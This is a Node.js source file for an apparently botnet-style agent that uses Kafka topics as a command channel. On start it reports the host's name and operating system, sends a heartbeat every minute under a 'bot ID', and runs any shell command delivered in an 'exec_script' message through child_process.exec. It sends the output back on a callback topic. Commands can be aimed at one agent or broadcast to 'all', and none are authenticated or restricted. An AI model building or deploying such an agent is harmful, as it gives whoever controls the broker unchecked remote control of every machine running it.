const { Kafka } = require('kafkajs');
const schedule = require('node-schedule');
const { exec } = require('child_process');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

// Read configuration from config.txt
function readConfigFile(filePath) {
    const config = {};
    const data = fs.readFileSync(filePath, 'utf8');
    data.split('\n').forEach(line => {
        line = line.trim();
        if (line && !line.startsWith('#')) {
            const [key, value] = line.split('=');
            config[key.trim()] = value.trim();
        }
    });
    return config;
}

const config = readConfigFile('config.txt');
const kafka = new Kafka({
    clientId: 'my-app',
    brokers: config.bootstrap_servers.split(','),
});

const producer = kafka.producer();
const consumer = kafka.consumer({ groupId: uuidv4() });

async function produceMessage(topic, task) {
    await producer.connect();
    await producer.send({
        topic,
        messages: [
            { value: JSON.stringify(task) },
        ],
    });
    await producer.disconnect();
}

async function handleCallback(task, groupId) {
    console.log(`Received order ${JSON.stringify(task)}`);
    if (task.actionType === 'exec_script' || task.actionType === 'os_exec_script') {
        console.log('Received script execution order, proceeding to execute it');
        const scriptValue = task.parameters.value;
        try {
            const result = await new Promise((resolve, reject) => {
                exec(scriptValue, (error, stdout, stderr) => {
                    if (error) {
                        reject(error);
                    }
                    resolve(stdout);
                });
            });
            console.log(`Script output: ${result}`);

            const callbackTask = {
                actionType: 'callback',
                parameters: {
                    groupId,
                    taskId: task.id,
                },
                result,
            };
            await produceMessage('callback', callbackTask);
        } catch (e) {
            console.error(`Script execution failed: ${e}`);
        }
    }
}

async function produceHeartBeat(topic, botId) {
    console.log(`Heartbeat message produced to topic ${topic} by bot ID ${botId}`);
    const heartBeatTask = {
        actionType: 'heartbeat',
        parameters: {
            botId,
        },
        result: "success",
    };
    await produceMessage("heartbeat", heartBeatTask);
}

async function main() {
    const groupId = uuidv4();
    await consumer.connect();
    await consumer.subscribe({ topic: config.topic, fromBeginning: true });

    await consumer.run({
        eachMessage: async ({ topic, partition, message }) => {
            const task = JSON.parse(message.value.toString());

            console.log(`Received message: ${JSON.stringify(message)}`);
            const headers = message.headers;
            if (headers) {
                console.log('Message headers:');
                // Example: Access a specific header
                const recipientId = headers.recipientId;
                if (!!recipientId) {
                    const recipientIdValue = recipientId.toString();
                    console.log(`Recipient ID: ${recipientId}`);
                    if (recipientIdValue != null && (recipientIdValue === groupId || recipientIdValue === 'all')) {
                        await handleCallback(task, groupId);
                    }
                }
            }
        }
    });

    console.log(`Kafka consumer opened successfully on topic ${config.topic}`);

    const initialTask = {
        id: '',
        actionType: 'init',
        parameters: {
            groupId,
            os: require('os').platform(),
            name: require('os').hostname(),
        },
        result: "success",
    };
    await produceMessage("init", initialTask);
    console.log(`Initial message produced to topic ${config.topic} with group ID ${groupId}`);

    schedule.scheduleJob('*/60 * * * * *', () => {
        produceHeartBeat(config.topic, groupId);
    });
    console.log(`Initialized scheduled heartbeat system for group ID ${groupId}`);
}

main().catch(console.error);
